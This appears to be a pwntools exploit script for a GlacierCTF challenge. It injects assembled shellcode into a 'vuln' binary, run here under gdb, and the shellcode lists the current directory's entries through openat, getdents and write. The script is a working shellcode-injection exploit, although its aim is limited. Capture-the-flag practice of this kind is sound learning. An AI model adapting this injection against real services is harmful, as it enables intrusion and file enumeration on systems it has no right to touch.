from pwn import *

context.terminal = ['tmux','splitw' ,'-h']
context.update(arch='amd64')

#p = remote('chall.glacierctf.com', 13383)
#p = process('./vuln')
p = gdb.debug('./vuln', '''
b *main+220''')

AT_FDCWD = -100

sc  = asm(shellcraft.linux.openat(AT_FDCWD, '.', 0))
sc += asm(shellcraft.getdents(3, 'rsp', 32))
sc += asm(shellcraft.linux.write(1, 'rsp', 32))
sc += asm(shellcraft.linux.exit(0))

info(sc)

p.recvuntil('Shellcode:')
p.sendline(sc)
p.interactive()
